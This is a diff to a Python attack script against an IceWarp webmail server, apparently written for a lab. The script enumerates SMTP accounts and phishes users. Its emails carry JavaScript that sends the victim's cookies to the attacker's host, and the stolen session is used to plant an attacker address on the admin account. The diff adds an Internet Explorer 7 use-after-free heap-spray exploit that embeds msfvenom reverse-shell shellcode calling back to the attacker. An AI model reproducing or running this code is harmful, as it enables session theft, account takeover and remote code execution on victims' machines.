@@ -10,6 +10,8 @@ from smtplib import SMTP
 from time import sleep
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+import http.server
+import socketserver
 import requests
 import sys
 import urllib.parse
@@ -41,7 +43,7 @@ import socket
 
 _Gr="\u001b[32;1m"
 _End="\u001b[0m"
-
+_Blu="\u001b[34;1m"
 
 clean = False
 debug = 0
@@ -99,7 +101,7 @@ if debug > 0:
 
 if clean:
     if debug > 0:
-        sys.stdout.write("[D] Cleaning things up... \n")
+        sys.stdout.write(f"{_Blu}[D] Cleaning things up...{_End} \n")
     system( "rm ./cirt-default-usernames.txt 1>/dev/null 2>&1")
 
 
@@ -113,13 +115,12 @@ nm.scan(hosts=RHOST,arguments=nmap_args)
 if nm[RHOST]['status']['state'] not in ['up']:
     sys.stderr.write(f"[-] Host {RHOST} is not up\n\n")
     sys.exit(-1)
-sys.stdout.write(f"{_Gr}[+] {RHOST} appears up{_End}\n")
+print(f"{_Gr}[+] {RHOST} appears up{_End}")
 
 if nm[RHOST]['tcp'][RPORT_SMTP]['state'] not in ['open','open|filtered']:
     sys.stderr.write(f"[-] Port {RPORT_SMTP} is not open on rhost {RHOST}\n\n")
     sys.exit(-1)
-sys.stdout.write(f"{_Gr}[+] {RHOST}:{RPORT_SMTP} appears open{_End}\n")
-sys.stdout.flush()
+print(f"{_Gr}[+] {RHOST}:{RPORT_SMTP} appears open{_End}")
 
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -132,9 +133,9 @@ if not smtpusers.exists():
     with open(list_file,"wb") as list_file_fd:
         response = requests.get(url)
         list_file_fd.write(response.content)
-    sys.stdout.write(f"[*] List file saved as: {list_file}\n")
+    print(f"[*] List file saved as: {list_file}")
 else:
-    sys.stdout.write("[*] Looks like an smtp users list is already present...\n")
+    print("[*] Looks like an smtp users list is already present")
 sys.stdout.flush()
 
 
@@ -146,11 +147,11 @@ ctr = 0
 ctr_total = 0
 accounts = []
 sys.stdout.write(   "[*] Enumerating email accounts\n"\
-                    "+------------------------------\n"\
-                    "| '.' = invalid list entry\n"\
-                    "| '*' = doesn't exist\n"\
-                    "| '!' = account found\n"\
-                    "-------------------------------\n")
+                    "+------------------------------+\n"\
+                    "| '.' = invalid list entry     |\n"\
+                    "| '*' = account doesn't exist  |\n"\
+                    "| '!' = account found          |\n"\
+                    "-------------------------------+\n")
 sys.stdout.flush()
 with open(list_file,"r") as fd:
     for line in fd:
@@ -189,13 +190,14 @@ sys.stdout.write(   f"\n"
                     f"Accounts found\n"
                     f"--------------\n")
 for account in accounts:
-    print(account)
+    print(f"{_Gr}{account}{_End}")
 
 # ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 # ;;;;;;; Phish Selection ;;;;;;;;;
 
+
+    # If cookie monster / cookie stealing .... 
     if mode == "cookie_monster":
-        # If Cookie Monster...
         email_body = f"""
         '<html>
             <body onload='document.location.replace("http://{LHOST}:{LPORT_WEB}/cookie="+document.cookie+"<br>"+"URL:"+document.location);'>
@@ -203,11 +205,11 @@ for account in accounts:
         </html>'
     """
 
+    # If MS09-002 browser exploitation...
     elif mode == "pwn":
-        # If Pwn...
         email_body = f"""
         '<html>
-            <body onload='document.location.replace("http://{LHOST}:{LPORT_WEB}/pwn<br>URL:"+document.location);'>
+            <body onload='document.location.replace("http://{LHOST}:{LPORT_WEB}");'>
             </body>
         </html>'
         """
@@ -262,27 +264,27 @@ class EchoHandler(asyncore.dispatcher_with_send):
                     if(data[i:i+7].decode() == "cookie="):
                         if "js_cipher=" in data[i+7:i+17].decode():
                             cookie = urllib.parse.unquote(data[i+7:i+75].decode()).split(';')
-                        elif "IceWarpWebMailSignUp=" in data[i+12:i+32].decode():
+                        elif "IceWarpWebMailSignUp=" in data[i+7:i+33].decode():
                             cookie = urllib.parse.unquote(data[i+7:i+143].decode()).split(';')
-                
-                if debug > 0:
-                    print(f"[D] Cookie: {cookie}")
-                    print(f"[D] id {new_id}")
-                
+                        elif "IceWarpWebMailSessID=" in data[i+7:i+33].decode():
+                            cookie = urllib.parse.unquote(data[i+7:i+143].decode()).split(';')
+
                 for x in cookie:
                     x = x.split('=')
                     for i in range(len(x)-1):
                         if i % 2 == 0:
                             new_cookie[x[i].strip()] = x[i+1].strip()
-                    
-                if debug > 0:
-                    print(f"[D] {new_cookie}")
                 
+                if debug > 0:
+                    print(f"{_Blu}[D] Cookie stirng: {cookie}{_End}")
+                    print(f"{_Blu}[D] Cookie parsed: {new_cookie}{_End}")
+                    print(f"{_Blu}[D] Id Parsed:     {new_id}{_End}")
+
                 _break = False
                 for i in range(0,10):
                     if _break:
                         break
-                    print(f"[*] Adding attacker server to alternate email...({i})")
+                    print(f"[*] Adding attacker server to alternate email...")
                     post_data = {"id":f"{new_id['id']}","accountid":f"{i}","Save_x":"1","action":"mod","account[USER]":"victim.com\\admin","account[EMAIL]":"admin@victim.com","account[PASS]":"*****","account[PASS2]":"*****","account[FULLNAME]":"Admin","account[ALTEMAIL]":"OS-40299@192.168.102.46","account[HOSTUSER]":"victim.com\\admin","account[COLOR]":"","Save_x":"Save+Changes"}
                     r1 = requests.post(f"http://{RHOST}:{RPORT_WEB}/mail/accountsettings_add.html",data=post_data,cookies=new_cookie)
                     print("[*] Checking to see if worked...")
@@ -294,7 +296,7 @@ class EchoHandler(asyncore.dispatcher_with_send):
                     
                     for i in range(0,len(r2.text)-103):
                         if '<TD ><INPUT TYPE="text" NAME="account[ALTEMAIL]" VALUE="OS-40299@192.168.102.46"  CLASS="ilong"></TD>' in r2.text[i:i+103]:
-                            print("[!] Attacker SMTP Server successfully added!")
+                            print(f"{_Gr}[!] Attacker SMTP Server successfully added!{_End}")
                             _break = True
                             break
     
@@ -309,7 +311,7 @@ class EchoServer(asyncore.dispatcher):
         pair = self.accept()
         if pair is not None:
             sock, addr = pair
-            print(f'[+] Incoming connection from {repr(addr)}')
+            print(f'{_Gr}[+] Incoming connection from {repr(addr)}{_End}')
             handler = EchoHandler(sock)
     
 class CustomSMTPServer(smtpd.SMTPServer):
@@ -322,6 +324,113 @@ class CustomSMTPServer(smtpd.SMTPServer):
         print("-----------------------------------------")
         return
     
-server1 = EchoServer(LHOST,LPORT_WEB)
-server2 = CustomSMTPServer((LHOST,LPORT_SMTP),None)
-asyncore.loop()
+if mode == "cookie_monster":
+    server1 = EchoServer(LHOST,LPORT_WEB)
+    server2 = CustomSMTPServer((LHOST,LPORT_SMTP),None)
+    asyncore.loop()
+
+
+
+class RequestHandler(http.server.SimpleHTTPRequestHandler):
+    def get_payload(self):
+        # msfvenom -a x86 --platform windows LHOST=192.168.102.46 LPORT=123 Encoder=PexFnstenvSub -f python -v payload EXITFUNC=process
+        # http://metasploit.com
+        payload =  ""
+        payload += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
+        payload += "\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
+        payload += "\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
+        payload += "\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
+        payload += "\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+        payload += "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
+        payload += "\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
+        payload += "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
+        payload += "\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
+        payload += "\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+        payload += "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+        payload += "\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
+        payload += "\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+        payload += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
+        payload += "\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+        payload += "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
+        payload += "\x66\x2e\x68\x02\x00\x00\x7b\x89\xe6\x6a\x10\x56"
+        payload += "\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
+        payload += "\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
+        payload += "\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
+        payload += "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
+        payload += "\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
+        payload += "\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
+        payload += "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
+        payload += "\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
+        payload += "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
+        return self.convert_to_utf16(payload)
+    
+    def get_exploit(self):
+        exploit = '''
+
+        function spray_heap()
+        {
+            var payload = unescape("<PAYLOAD>");
+
+            var ret = 0x0c0c0c0c;
+            var heap_chunk_size = 0x40000;
+
+            var nopsled_size = heap_chunk_size - (payload.length * 2)
+            var nopsled = unescape("%u0c0c%u0c0c");
+            while (nopsled.length < nopsled_size)
+                nopsled += nopsled;
+
+            heap_chunks = new Array();
+            heap_chunks_num = (ret - heap_chunk_size)/heap_chunk_size;
+            for (var i = 0 ; i < heap_chunks_num ; i++)
+                heap_chunks[i] = nopsled + payload;
+        }
+
+        function trigger_bug()
+        {
+            var obj = document.createElement("table");
+            obj.click;
+
+            var obj_cp = obj.cloneNode();
+            obj.clearAttributes();
+            obj = null;
+
+            CollectGarbage();
+
+            var img = document.createElement("img");
+            img.src = unescape("%u0c0c%u0c0cCCCCCCCCCCCCCCCCCCCCCC");
+
+            obj_cp.click;
+        }
+
+        if (navigator.userAgent.indexOf("MSIE 7") != -1) {
+            spray_heap();
+            trigger_bug()
+        } else
+            window.location = "about:blank"
+
+        '''
+        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
+        exploit = '<html><body><script>' + exploit + '</script></body></html>'
+        return exploit.encode('utf-16')
+    
+    def convert_to_utf16(self, payload):
+        # From Beta v2.0 by Berend-Jan Wever
+        # http://www.milw0rm.com/exploits/656
+        enc_payload = ''
+        for i in range(0, len(payload), 2):
+            num = 0
+            for j in range(0, 2):
+                num += (ord(payload[i+j]) & 0xff) << (j*8)
+            enc_payload += '%%u%04x' % num
+        return enc_payload
+    
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        print(f"{_Gr}[<] Sending  payload to {RHOST}:{RPORT_WEB}{_End}")
+        self.wfile.write(self.get_exploit())
+
+if mode == "pwn":
+    with socketserver.TCPServer((LHOST, LPORT_WEB), RequestHandler) as serv:
+        serv.serve_forever()
